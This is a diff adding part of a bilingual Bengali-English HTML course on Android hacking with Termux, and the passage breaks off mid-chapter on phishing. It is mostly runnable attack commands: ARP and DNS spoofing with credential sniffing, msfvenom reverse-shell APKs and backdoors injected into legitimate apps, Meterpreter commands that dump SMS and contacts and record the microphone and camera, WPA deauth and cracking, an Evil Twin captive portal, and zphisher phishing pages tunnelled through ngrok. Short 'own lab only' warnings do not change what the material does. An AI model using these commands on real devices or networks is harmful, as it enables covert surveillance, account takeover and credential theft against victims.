+<span class="c"># Kali Linux install করো (500MB+ download)</span>
+proot-distro install kali
+
+<span class="c"># Kali Linux-এ প্রবেশ করো</span>
+proot-distro login kali
+
+<span class="c"># Kali-তে ঢুকে tools install করো</span>
+apt update && apt upgrade -y
+apt install -y nmap metasploit-framework sqlmap \
+  hydra nikto gobuster subfinder \
+  aircrack-ng john hashcat
+
+<span class="c"># Kali থেকে বেরিয়ে আসতে</span>
+exit
+    </div>
+
+    <h2 class="sec">🔧 <span class="bn-text">Essential Tool Installation</span><span class="en-text">Essential Tool Installation</span></h2>
+    <div class="code">
+<span class="c"># Metasploit (সরাসরি Termux-এ)</span>
+curl https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh -o metasploit.sh
+chmod +x metasploit.sh && ./metasploit.sh
+
+<span class="c"># SQLmap</span>
+pip install sqlmap
+<span class="c"># অথবা</span>
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap && python sqlmap.py --version
+
+<span class="c"># Hydra (password brute force)</span>
+pkg install hydra
+
+<span class="c"># Nmap</span>
+pkg install nmap
+
+<span class="c"># Netcat</span>
+pkg install netcat-openbsd
+
+<span class="c"># theHarvester (OSINT)</span>
+pip install theHarvester
+
+<span class="c"># Sherlock (username OSINT)</span>
+git clone https://github.com/sherlock-project/sherlock.git
+cd sherlock && pip install -r requirements.txt
+    </div>
+
+    <h2 class="sec">📂 <span class="bn-text">Termux File System বোঝা</span><span class="en-text">Understanding Termux File System</span></h2>
+    <div class="diagram">
+<span class="dg">Termux Home Directory:</span>  /data/data/com.termux/files/home  (~)
+<span class="dg">Termux Prefix:</span>           /data/data/com.termux/files/usr
+<span class="dg">Android Storage:</span>         ~/storage/shared  (/sdcard)
+<span class="dg">Downloads:</span>               ~/storage/downloads
+
+<span class="dy">Important paths:</span>
+  ~/storage/shared/     → <span class="db">Phone-এর Internal Storage</span>
+  ~/storage/downloads/  → <span class="db">Download Folder</span>
+  ~/.bashrc             → <span class="db">Startup script (custom aliases)</span>
+  ~/.ssh/               → <span class="db">SSH keys</span>
+    </div>
+
+    <h2 class="sec">⚡ <span class="bn-text">Useful Aliases Setup</span><span class="en-text">Useful Aliases Setup</span></h2>
+    <div class="code">
+<span class="c"># ~/.bashrc এ add করো</span>
+nano ~/.bashrc
+
+<span class="c"># Add these aliases:</span>
+alias kali='proot-distro login kali'
+alias update='pkg update && pkg upgrade -y'
+alias tools='ls ~/tools/'
+alias myip='curl ifconfig.me'
+alias localip='ip addr show | grep inet'
+alias scan='nmap -sV -sC'
+alias msf='cd ~/metasploit-framework && ruby msfconsole'
+
+<span class="c"># Apply করো</span>
+source ~/.bashrc
+    </div>
+
+    <div class="chapter-summary">
+      <h3>⚙️ <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>📥 <span class="bn-text">F-Droid থেকে Termux Download করো — Play Store নয়</span><span class="en-text">Download Termux from F-Droid — not Play Store</span></li>
+        <li>🐉 <span class="bn-text">proot-distro দিয়ে Kali Linux চালাও — Root ছাড়া</span><span class="en-text">Run Kali Linux via proot-distro — no root needed</span></li>
+        <li>🔧 <span class="bn-text">nmap, metasploit, hydra, sqlmap — সব Termux-এ চলে</span><span class="en-text">nmap, metasploit, hydra, sqlmap — all run in Termux</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ CHAPTER 3 ═══ -->
+<div class="chapter ch3">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 03</div>
+    <div class="chapter-title">🏗️ <span class="bn-text">Android Architecture ও ADB</span><span class="en-text">Android Architecture & ADB</span></div>
+    <div class="chapter-desc"><span class="bn-text">Android-এর ভেতরের Structure বোঝা এবং ADB দিয়ে Device Control করা</span><span class="en-text">Understanding Android's internal structure and controlling devices with ADB</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">🏗️ <span class="bn-text">Android Architecture</span><span class="en-text">Android Architecture</span></h2>
+    <div class="diagram">
+<span class="dg">┌─────────────────────────────────────────────┐</span>
+<span class="dg">│           APPLICATIONS LAYER                │</span>
+<span class="dg">│    (Instagram, WhatsApp, Banking App, etc)  │</span>
+<span class="dg">├─────────────────────────────────────────────┤</span>
+<span class="dy">│         APPLICATION FRAMEWORK               │</span>
+<span class="dy">│   (Activity Manager, Package Manager,       │</span>
+<span class="dy">│    Content Providers, Notification Manager) │</span>
+<span class="dy">├─────────────────────────────────────────────┤</span>
+<span class="db">│    ANDROID RUNTIME + NATIVE LIBRARIES       │</span>
+<span class="db">│     (ART/Dalvik JVM, WebKit, SQLite)        │</span>
+<span class="db">├─────────────────────────────────────────────┤</span>
+<span class="dr">│            LINUX KERNEL                     │</span>
+<span class="dr">│   (Drivers, Power Mgmt, SELinux, Binder)    │</span>
+<span class="dr">└─────────────────────────────────────────────┘</span>
+    </div>
+
+    <h2 class="sec">🔌 ADB — Android Debug Bridge</h2>
+    <p><span class="bn-text">ADB হলো Android-এর সাথে Computer বা অন্য Android Device-এর communication tool। এটা Hacker-দের জন্য অত্যন্ত শক্তিশালী।</span><span class="en-text">ADB is a communication tool between Android and a computer or another Android device. It's extremely powerful for hackers.</span></p>
+    <div class="code">
+<span class="c"># Termux-এ ADB install</span>
+pkg install android-tools
+
+<span class="c"># Device connect করো (USB বা WiFi)</span>
+adb devices                          <span class="c"># connected devices list</span>
+adb connect 192.168.1.100:5555       <span class="c"># WiFi ADB</span>
+
+<span class="c"># File operations</span>
+adb push local_file.txt /sdcard/     <span class="c"># phone-এ file পাঠাও</span>
+adb pull /sdcard/file.txt ./         <span class="c"># phone থেকে file নাও</span>
+
+<span class="c"># Shell access</span>
+adb shell                            <span class="c"># interactive shell</span>
+adb shell ls /data/data/             <span class="c"># app data (root needed)</span>
+adb shell dumpsys battery            <span class="c"># system info</span>
+
+<span class="c"># APK Management</span>
+adb install app.apk                  <span class="c"># APK install</span>
+adb uninstall com.package.name       <span class="c"># uninstall app</span>
+adb shell pm list packages           <span class="c"># সব apps list</span>
+adb shell pm list packages -3        <span class="c"># শুধু 3rd party apps</span>
+
+<span class="c"># Screen capture</span>
+adb shell screencap /sdcard/screen.png
+adb pull /sdcard/screen.png ./
+
+<span class="c"># Network info</span>
+adb shell netstat -an
+adb shell ip addr show
+    </div>
+
+    <h2 class="sec">🔒 Android Security Model</h2>
+    <div class="grid2">
+      <div class="card">
+        <h4>🛡️ Security Features</h4>
+        <ul>
+          <li><strong>SELinux</strong> — <span class="bn-text">Mandatory Access Control</span><span class="en-text">Mandatory Access Control</span></li>
+          <li><strong>Sandbox</strong> — <span class="bn-text">প্রতিটি App isolated</span><span class="en-text">Each app isolated</span></li>
+          <li><strong>Permissions</strong> — <span class="bn-text">Runtime permission system</span><span class="en-text">Runtime permission system</span></li>
+          <li><strong>Keystore</strong> — <span class="bn-text">Hardware-backed key storage</span><span class="en-text">Hardware-backed key storage</span></li>
+          <li><strong>Play Protect</strong> — <span class="bn-text">Malware detection</span><span class="en-text">Malware detection</span></li>
+        </ul>
+      </div>
+      <div class="card danger-card">
+        <h4>⚠️ Common Weaknesses</h4>
+        <ul>
+          <li>Hardcoded API keys in APK</li>
+          <li>Insecure data storage (/sdcard)</li>
+          <li>Unencrypted SQLite databases</li>
+          <li>Exported Activities/Services</li>
+          <li>Insecure WebView implementations</li>
+          <li>Weak SSL/TLS certificate validation</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🏗️ <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>🔌 <span class="bn-text">ADB = Android Hacker-এর Swiss Army Knife</span><span class="en-text">ADB = Android Hacker's Swiss Army Knife</span></li>
+        <li>🏗️ <span class="bn-text">Android Architecture জানলে কোথায় Bug খুঁজতে হবে বোঝা যায়</span><span class="en-text">Knowing Android architecture shows where to look for bugs</span></li>
+        <li>🔒 <span class="bn-text">SELinux + Sandbox — ভাঙা কঠিন কিন্তু Misconfig সহজ</span><span class="en-text">SELinux + Sandbox — hard to break, but misconfig is easy</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ CHAPTER 4 ═══ -->
+<div class="chapter ch4">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 04</div>
+    <div class="chapter-title">🌐 Network Attacks — MITM, ARP Spoofing</div>
+    <div class="chapter-desc"><span class="bn-text">Local Network-এ আক্রমণ — Termux দিয়ে নেটওয়ার্ক হ্যাকিং</span><span class="en-text">Attacking local networks — network hacking with Termux</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">🗺️ <span class="bn-text">Network Scanning</span><span class="en-text">Network Scanning</span></h2>
+    <div class="code">
+<span class="c"># নিজের IP খুঁজে বের করো</span>
+ip addr show wlan0
+ifconfig wlan0
+
+<span class="c"># Network-এ সব Device খোঁজো (nmap)</span>
+nmap -sn 192.168.1.0/24             <span class="c"># Host discovery</span>
+nmap -sV -sC 192.168.1.100          <span class="c"># Service detection</span>
+nmap -p- --min-rate 5000 192.168.1.100   <span class="c"># All ports</span>
+nmap -O 192.168.1.100               <span class="c"># OS detection</span>
+
+<span class="c"># netdiscover (ARP-based discovery)</span>
+pkg install netdiscover
+netdiscover -r 192.168.1.0/24
+
+<span class="c"># Output example:</span>
+<span class="g">192.168.1.1    00:11:22:33:44:55   Router (TP-Link)
+192.168.1.100  AA:BB:CC:DD:EE:FF   Samsung Galaxy
+192.168.1.101  11:22:33:44:55:66   HP Laptop</span>
+    </div>
+
+    <h2 class="sec">🎭 ARP Spoofing ও MITM Attack</h2>
+    <div class="box danger">
+      <div class="box-t">⚠️ <span class="bn-text">শুধু নিজের Network-এ Test করো</span><span class="en-text">Only test on your own network</span></div>
+      <span class="bn-text">ARP Spoofing করলে Network-এর Traffic তোমার Device-এর মধ্য দিয়ে যায়। এটা শুধু নিজের Lab-এ করো।</span>
+      <span class="en-text">ARP Spoofing routes network traffic through your device. Only do this in your own lab.</span>
+    </div>
+    <div class="code">
+<span class="c"># arpspoof install</span>
+pkg install dsniff
+
+<span class="c"># IP Forwarding চালু করো</span>
+echo 1 > /proc/sys/net/ipv4/ip_forward   <span class="c"># (root লাগতে পারে)</span>
+sysctl -w net.ipv4.ip_forward=1
+
+<span class="c"># ARP Spoofing শুরু করো (দুটো terminal-এ)</span>
+<span class="c"># Terminal 1: Router-কে বলো victim তুমি</span>
+arpspoof -i wlan0 -t 192.168.1.100 192.168.1.1
+
+<span class="c"># Terminal 2: Victim-কে বলো Router তুমি</span>
+arpspoof -i wlan0 -t 192.168.1.1 192.168.1.100
+
+<span class="c"># Packet Sniffing (tcpdump)</span>
+tcpdump -i wlan0 -w capture.pcap
+tcpdump -i wlan0 host 192.168.1.100
+tcpdump -i wlan0 port 80 -A          <span class="c"># HTTP traffic (plaintext)</span>
+    </div>
+
+    <h2 class="sec">🔧 Bettercap — <span class="bn-text">শক্তিশালী MITM Tool</span><span class="en-text">Powerful MITM Tool</span></h2>
+    <div class="code">
+<span class="c"># Bettercap install (Kali in Termux)</span>
+apt install bettercap
+
+<span class="c"># Bettercap interactive mode</span>
+bettercap -iface wlan0
+
+<span class="c"># Bettercap commands:</span>
+net.probe on              <span class="c"># network scan শুরু</span>
+net.show                  <span class="c"># সব device দেখাও</span>
+set arp.spoof.targets 192.168.1.100
+arp.spoof on              <span class="c"># MITM শুরু</span>
+net.sniff on              <span class="c"># Traffic capture শুরু</span>
+http.proxy on             <span class="c"># HTTP proxy চালু</span>
+https.proxy on            <span class="c"># HTTPS proxy (SSL strip)</span>
+
+<span class="c"># Credential harvesting</span>
+set net.sniff.verbose true
+set net.sniff.filter "port 80 or port 443"
+    </div>
+
+    <h2 class="sec">📡 DNS Spoofing</h2>
+    <div class="code">
+<span class="c"># DNS Spoofing config file তৈরি</span>
+cat > dns_spoof.conf << 'EOF'
+*.facebook.com  192.168.1.X    # Attacker IP
+*.google.com    192.168.1.X
+EOF
+
+<span class="c"># Bettercap-এ DNS Spoof</span>
+set dns.spoof.domains facebook.com,google.com
+set dns.spoof.address 192.168.1.X   <span class="c"># Your IP</span>
+dns.spoof on
+    </div>
+
+    <div class="chapter-summary">
+      <h3>🌐 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>🗺️ <span class="bn-text">nmap দিয়ে Network Scan করো — সব Device খুঁজে বের করো</span><span class="en-text">Scan networks with nmap — find all devices</span></li>
+        <li>🎭 <span class="bn-text">ARP Spoof = Traffic তোমার মধ্য দিয়ে পাঠানো</span><span class="en-text">ARP Spoof = route traffic through you</span></li>
+        <li>🔧 <span class="bn-text">Bettercap = সেরা MITM Framework</span><span class="en-text">Bettercap = best MITM framework</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ CHAPTER 5 ═══ -->
+<div class="chapter ch5">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 05</div>
+    <div class="chapter-title">📲 APK Analysis ও Reverse Engineering</div>
+    <div class="chapter-desc"><span class="bn-text">Android App-এর ভেতরে কী আছে দেখো — Secret খুঁজে বের করো</span><span class="en-text">See what's inside Android apps — find hidden secrets</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">🔍 <span class="bn-text">APK কী এবং কীভাবে কাজ করে?</span><span class="en-text">What is an APK and How Does It Work?</span></h2>
+    <div class="diagram">
+APK File Structure:
+<span class="dg">app.apk</span> (actually a ZIP file)
+  ├── <span class="dy">AndroidManifest.xml</span>  ← Permissions, Components, Export
+  ├── <span class="db">classes.dex</span>           ← Compiled Java/Kotlin code
+  ├── <span class="dg">res/</span>                  ← Resources (images, strings)
+  ├── <span class="dt">assets/</span>               ← Raw files (often has API keys!)
+  ├── <span class="dr">lib/</span>                  ← Native .so libraries
+  └── <span class="dy">META-INF/</span>             ← Signature files
+    </div>
+
+    <h2 class="sec">🛠️ APK Decompile করা — apktool</h2>
+    <div class="code">
+<span class="c"># apktool install</span>
+pkg install apktool
+<span class="c"># অথবা</span>
+pip install apktool
+
+<span class="c"># APK Decompile করো</span>
+apktool d app.apk -o output_folder
+
+<span class="c"># Decompiled Structure:</span>
+<span class="g">output_folder/
+├── AndroidManifest.xml  ← এটা সবার আগে পড়ো!
+├── smali/               ← Decompiled code (Smali bytecode)
+├── res/
+│   ├── values/strings.xml  ← API keys এখানে থাকে!
+│   └── raw/
+└── assets/              ← Hardcoded credentials!</span>
+
+<span class="c"># AndroidManifest.xml এ কী দেখবে?</span>
+cat output_folder/AndroidManifest.xml | grep -i "exported\|permission\|debuggable"
+
+<span class="c"># Sensitive strings খোঁজো</span>
+grep -ri "api_key\|apikey\|password\|secret\|token\|aws\|firebase" output_folder/
+grep -ri "http://\|https://" output_folder/res/values/strings.xml
+    </div>
+
+    <h2 class="sec">☕ jadx — Java Code দেখা</h2>
+    <div class="code">
+<span class="c"># jadx install (Termux/Kali)</span>
+apt install jadx   <span class="c"># Kali-তে</span>
+<span class="c"># অথবা GitHub থেকে download করো</span>
+wget https://github.com/skylot/jadx/releases/latest/download/jadx-1.5.0.zip
+unzip jadx-1.5.0.zip -d jadx/
+
+<span class="c"># APK থেকে Java code বের করো</span>
+jadx -d output_dir app.apk
+
+<span class="c"># Interesting class খোঁজো</span>
+find output_dir -name "*.java" | xargs grep -l "password\|secret\|key"
+
+<span class="c"># Network calls খুঁজো</span>
+grep -r "OkHttp\|Retrofit\|HttpURLConnection\|URL(" output_dir/ | head -20
+
+<span class="c"># Firebase config খোঁজো</span>
+grep -r "firebaseapp\|firebase\|google-services" output_dir/
+    </div>
+
+    <h2 class="sec">📋 <span class="bn-text">AndroidManifest.xml Analysis</span><span class="en-text">AndroidManifest.xml Analysis</span></h2>
+    <div class="code">
+<span class="c"># Dangerous permissions চেক করো</span>
+grep -E "READ_SMS|READ_CONTACTS|ACCESS_FINE_LOCATION|CAMERA|RECORD_AUDIO" \
+  AndroidManifest.xml
+
+<span class="c"># Exported Activities (access without auth!)</span>
+grep 'android:exported="true"' AndroidManifest.xml
+
+<span class="c"># Debuggable app (major security flaw)</span>
+grep 'android:debuggable="true"' AndroidManifest.xml
+
+<span class="c"># ADB দিয়ে Exported Activity launch করো</span>
+adb shell am start -n com.package/.ExportedActivity
+
+<span class="c"># Content Provider test করো</span>
+adb shell content query --uri content://com.package.provider/data
+    </div>
+
+    <h2 class="sec">🔐 <span class="bn-text">Static Analysis Checklist</span><span class="en-text">Static Analysis Checklist</span></h2>
+    <div class="box success">
+      <div class="box-t">✅ <span class="bn-text">APK Analysis-এ কী কী দেখবে</span><span class="en-text">What to Check in APK Analysis</span></div>
+      <ul>
+        <li>☐ <code>android:debuggable="true"</code> — <span class="bn-text">Debug mode চালু?</span><span class="en-text">Debug mode on?</span></li>
+        <li>☐ <code>android:allowBackup="true"</code> — <span class="bn-text">Backup allow?</span><span class="en-text">Backup allowed?</span></li>
+        <li>☐ <span class="bn-text">Hardcoded API keys/passwords in strings.xml</span><span class="en-text">Hardcoded API keys/passwords in strings.xml</span></li>
+        <li>☐ <span class="bn-text">Exported Activities ও Services</span><span class="en-text">Exported Activities and Services</span></li>
+        <li>☐ <span class="bn-text">HTTP (not HTTPS) endpoints</span><span class="en-text">HTTP (not HTTPS) endpoints</span></li>
+        <li>☐ <span class="bn-text">Insecure SSL/TLS (certificate pinning missing)</span><span class="en-text">Insecure SSL/TLS (certificate pinning missing)</span></li>
+        <li>☐ <span class="bn-text">Sensitive data stored in SharedPreferences</span><span class="en-text">Sensitive data stored in SharedPreferences</span></li>
+      </ul>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>📲 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>🔍 <span class="bn-text">APK = ZIP file — apktool দিয়ে unzip করো</span><span class="en-text">APK = ZIP file — unzip it with apktool</span></li>
+        <li>☕ <span class="bn-text">jadx দিয়ে Java code পড়ো — API keys খোঁজো</span><span class="en-text">Read Java code with jadx — search for API keys</span></li>
+        <li>📋 <span class="bn-text">AndroidManifest.xml = Bug Hunter-এর গুপ্তধন</span><span class="en-text">AndroidManifest.xml = bug hunter's treasure chest</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ CHAPTER 6 ═══ -->
+<div class="chapter ch6">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 06</div>
+    <div class="chapter-title">💣 Metasploit in Termux — Android Exploitation</div>
+    <div class="chapter-desc"><span class="bn-text">Android APK Backdoor তৈরি, Reverse Shell এবং Meterpreter Session</span><span class="en-text">Creating Android APK backdoors, reverse shells, and Meterpreter sessions</span></div>
+  </div>
+  <div class="chapter-body">
+    <div class="box danger">
+      <div class="box-t">🔴 <span class="bn-text">শুধু নিজের Device-এ Test করো</span><span class="en-text">Only Test on Your Own Device</span></div>
+      <span class="bn-text">এই Chapter-এর সব Content শুধু Educational। নিজের Device বা Lab-এ Test করো। অন্যের Device-এ করলে Cybercrime।</span>
+      <span class="en-text">All content in this chapter is educational only. Test on your own device or lab. Doing it on others' devices is a cybercrime.</span>
+    </div>
+
+    <h2 class="sec">⚙️ Metasploit Setup in Termux</h2>
+    <div class="code">
+<span class="c"># Method 1: Kali in proot-distro</span>
+proot-distro login kali
+apt install metasploit-framework
+msfconsole
+
+<span class="c"># Method 2: Direct Termux script</span>
+pkg install unstable-repo
+pkg install metasploit
+
+<span class="c"># Metasploit Database setup</span>
+msfdb init
+msfconsole
+
+<span class="c"># Basic msfconsole commands</span>
+msf6 > help                          <span class="c"># সব command দেখো</span>
+msf6 > search android                <span class="c"># Android modules খোঁজো</span>
+msf6 > use exploit/multi/handler     <span class="c"># Listener চালু করো</span>
+    </div>
+
+    <h2 class="sec">🎭 msfvenom — Android APK Payload তৈরি</h2>
+    <div class="code">
+<span class="c"># Android Reverse Shell APK তৈরি</span>
+msfvenom -p android/meterpreter/reverse_tcp \
+  LHOST=192.168.1.X \
+  LPORT=4444 \
+  -o evil_app.apk
+
+<span class="c"># Legitimate APK-এর সাথে Backdoor Inject</span>
+msfvenom -p android/meterpreter/reverse_tcp \
+  LHOST=192.168.1.X \
+  LPORT=4444 \
+  -x original_app.apk \
+  -o backdoored_app.apk
+
+<span class="c"># HTTPS payload (more stealthy)</span>
+msfvenom -p android/meterpreter/reverse_https \
+  LHOST=your_domain.com \
+  LPORT=443 \
+  -o secure_payload.apk
+
+<span class="c"># Stageless payload (no internet needed)</span>
+msfvenom -p android/meterpreter_reverse_tcp \
+  LHOST=192.168.1.X \
+  LPORT=4444 \
+  -o stageless.apk
+    </div>
+
+    <h2 class="sec">🎧 Listener Setup — Session পাওয়া</h2>
+    <div class="code">
+<span class="c"># msfconsole-এ Listener চালু করো</span>
+msfconsole -q
+
+msf6 > use exploit/multi/handler
+msf6 exploit(handler) > set payload android/meterpreter/reverse_tcp
+msf6 exploit(handler) > set LHOST 192.168.1.X
+msf6 exploit(handler) > set LPORT 4444
+msf6 exploit(handler) > set ExitOnSession false
+msf6 exploit(handler) > exploit -j
+
+<span class="c"># Victim APK install করলে session আসবে:</span>
+<span class="g">[*] Started reverse TCP handler on 192.168.1.X:4444
+[*] Sending stage (65536 bytes) to 192.168.1.101
+[*] Meterpreter session 1 opened</span>
+
+<span class="c"># Session-এ ঢোকো</span>
+msf6 > sessions -l           <span class="c"># সব sessions দেখো</span>
+msf6 > sessions -i 1         <span class="c"># Session 1-এ ঢোকো</span>
+    </div>
+
+    <h2 class="sec">🔮 Meterpreter Commands — Android Control</h2>
+    <div class="code">
+<span class="c"># System Information</span>
+meterpreter > sysinfo          <span class="c"># Device info</span>
+meterpreter > getuid           <span class="c"># Current user</span>
+meterpreter > pwd              <span class="c"># Current directory</span>
+
+<span class="c"># File System</span>
+meterpreter > ls               <span class="c"># List files</span>
+meterpreter > download /sdcard/DCIM/photo.jpg ./
+meterpreter > upload local.txt /sdcard/
+
+<span class="c"># Android-specific commands</span>
+meterpreter > dump_sms         <span class="c"># SMS পড়ো</span>
+meterpreter > dump_contacts    <span class="c"># Contacts নাও</span>
+meterpreter > geolocate        <span class="c"># GPS location</span>
+meterpreter > record_mic 10    <span class="c"># Microphone record (10 sec)</span>
+meterpreter > webcam_snap      <span class="c"># Camera snap</span>
+meterpreter > send_sms -d +8801XXXXXXXXX -t "Test"  <span class="c"># SMS পাঠাও</span>
+
+<span class="c"># Network</span>
+meterpreter > ifconfig
+meterpreter > route
+meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.1
+
+<span class="c"># Shell access</span>
+meterpreter > shell            <span class="c"># Android shell</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>💣 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>⚙️ <span class="bn-text">Kali in proot-distro = সহজে Metasploit</span><span class="en-text">Kali in proot-distro = easy Metasploit</span></li>
+        <li>🎭 <span class="bn-text">msfvenom = APK Payload তৈরির tool</span><span class="en-text">msfvenom = tool for creating APK payloads</span></li>
+        <li>🔮 <span class="bn-text">Meterpreter = Remote Device Control</span><span class="en-text">Meterpreter = remote device control</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ CHAPTER 7 ═══ -->
+<div class="chapter ch7">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 07</div>
+    <div class="chapter-title">📡 WiFi Hacking — Wireless Attacks</div>
+    <div class="chapter-desc"><span class="bn-text">WPA/WPA2 Crack, Evil Twin, Deauth — Wireless Network Security Testing</span><span class="en-text">WPA/WPA2 Crack, Evil Twin, Deauth — Wireless Network Security Testing</span></div>
+  </div>
+  <div class="chapter-body">
+    <div class="box warn">
+      <div class="box-t">⚠️ <span class="bn-text">WiFi Hacking-এর জন্য External WiFi Adapter লাগবে</span><span class="en-text">WiFi Hacking Requires an External WiFi Adapter</span></div>
+      <span class="bn-text">Android-এর built-in WiFi Monitor Mode support করে না। External USB WiFi Adapter (OTG) লাগবে যেটা Monitor Mode ও Packet Injection support করে। যেমন: Alfa AWUS036ACH।</span>
+      <span class="en-text">Android's built-in WiFi doesn't support Monitor Mode. You need an external USB WiFi adapter (OTG) that supports Monitor Mode and Packet Injection. Example: Alfa AWUS036ACH.</span>
+    </div>
+
+    <h2 class="sec">📡 WiFi Reconnaissance</h2>
+    <div class="code">
+<span class="c"># WiFi interface খুঁজো</span>
+ip link show
+iwconfig
+
+<span class="c"># Monitor Mode চালু করো</span>
+airmon-ng start wlan0
+<span class="c"># Interface হবে wlan0mon</span>
+
+<span class="c"># Nearby WiFi networks scan করো</span>
+airodump-ng wlan0mon
+
+<span class="c"># Specific network-এর packets capture করো</span>
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
+  -w capture wlan0mon
+<span class="c"># -c = channel, --bssid = Router MAC, -w = output file</span>
+
+<span class="c"># Output:</span>
+<span class="g">BSSID              PWR  CH  #Data  ESSID
+AA:BB:CC:DD:EE:FF  -60   6     12  HomeWiFi
+11:22:33:44:55:66  -75  11      5  OfficeNet</span>
+    </div>
+
+    <h2 class="sec">💥 WPA/WPA2 Handshake Capture ও Crack</h2>
+    <div class="code">
+<span class="c"># Deauth attack — Client disconnect করো (Handshake নেওয়ার জন্য)</span>
+aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+<span class="c"># Client reconnect করলে Handshake পাওয়া যাবে</span>
+
+<span class="c"># Handshake Capture confirmation:</span>
+<span class="g">[*] WPA handshake: AA:BB:CC:DD:EE:FF  ← সফল!</span>
+
+<span class="c"># Dictionary Attack দিয়ে crack করো</span>
+aircrack-ng -w /usr/share/wordlists/rockyou.txt \
+  -b AA:BB:CC:DD:EE:FF capture-01.cap
+
+<span class="c"># hashcat দিয়ে GPU crack (faster)</span>
+hcxdumptool -i wlan0mon -o capture.pcapng
+hcxpcapngtool -o hash.hc22000 capture.pcapng
+hashcat -m 22000 hash.hc22000 rockyou.txt
+
+<span class="c"># WPS Pin Attack (যদি WPS চালু থাকে)</span>
+wash -i wlan0mon                     <span class="c"># WPS-enabled networks</span>
+reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
+    </div>
+
+    <h2 class="sec">😈 Evil Twin Attack</h2>
+    <div class="code">
+<span class="c"># Fake Access Point তৈরি করো</span>
+<span class="c"># hostapd config file</span>
+cat > fake_ap.conf << 'EOF'
+interface=wlan0
+driver=nl80211
+ssid=HomeWiFi         # Same name as victim AP
+channel=6
+hw_mode=g
+EOF
+
+hostapd fake_ap.conf
+
+<span class="c"># DHCP Server চালু করো</span>
+dnsmasq --interface=wlan0 \
+  --dhcp-range=192.168.2.2,192.168.2.100,255.255.255.0,12h \
+  --no-daemon
+
+<span class="c"># Captive Portal (credential capture)</span>
+<span class="c"># Simple Python HTTP server</span>
+python3 -m http.server 80 --directory phishing_page/
+    </div>
+
+    <div class="chapter-summary">
+      <h3>📡 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>📡 <span class="bn-text">Monitor Mode-এর জন্য External WiFi Adapter লাগবে</span><span class="en-text">External WiFi adapter needed for monitor mode</span></li>
+        <li>💥 <span class="bn-text">aircrack-ng = WPA Handshake capture ও crack</span><span class="en-text">aircrack-ng = WPA handshake capture and crack</span></li>
+        <li>😈 <span class="bn-text">Evil Twin = Fake AP দিয়ে credential চুরি</span><span class="en-text">Evil Twin = steal credentials with fake AP</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ CHAPTER 8 ═══ -->
+<div class="chapter ch8">
+  <div class="chapter-header">
+    <div class="chapter-label">Chapter 08</div>
+    <div class="chapter-title">🎣 <span class="bn-text">Phishing ও Social Engineering</span><span class="en-text">Phishing & Social Engineering</span></div>
+    <div class="chapter-desc"><span class="bn-text">Termux দিয়ে Phishing Page তৈরি, URL Tunneling এবং Credential Harvesting</span><span class="en-text">Creating phishing pages with Termux, URL tunneling, and credential harvesting</span></div>
+  </div>
+  <div class="chapter-body">
+    <h2 class="sec">🔗 ngrok ও cloudflared — <span class="bn-text">Public URL পাওয়া</span><span class="en-text">Getting a Public URL</span></h2>
+    <div class="code">
+<span class="c"># ngrok install</span>
+pkg install wget unzip
+wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz
+tar xvzf ngrok-v3-stable-linux-arm64.tgz
+chmod +x ngrok && mv ngrok $PREFIX/bin/
+
+<span class="c"># ngrok account-এ signup করো (free)</span>
+ngrok config add-authtoken YOUR_TOKEN
+
+<span class="c"># HTTP server চালু করো</span>
+python3 -m http.server 8080
+
+<span class="c"># ngrok দিয়ে public করো</span>
+ngrok http 8080
+<span class="c"># Output: https://abc123.ngrok.io → localhost:8080</span>
+
+<span class="c"># cloudflared (alternative, no account needed)</span>
+pkg install cloudflared
+cloudflared tunnel --url http://localhost:8080
+    </div>
+
+    <h2 class="sec">🎣 zphisher — <span class="bn-text">Phishing Tool</span><span class="en-text">Phishing Tool</span></h2>
+    <div class="code">
+<span class="c"># zphisher install</span>
+git clone https://github.com/htr-tech/zphisher.git
+cd zphisher
+chmod +x zphisher.sh
+bash zphisher.sh
+
+<span class="c"># zphisher menu থেকে select করো:</span>
+<span class="y">01) Facebook     02) Instagram    03) Google
+04) Twitter      05) Netflix      06) PayPal
+07) Steam        08) TikTok       09) Spotify
+...আরও অনেক...</span>
+
+<span class="c"># Phishing URL পাওয়া যাবে:</span>
+<span class="g">URL 1: https://is.gd/xxxxxxx (Shortened)
+URL 2: https://abc123.ngrok.io (ngrok)</span>
+
+<span class="c"># Victim enter করলে:</span>
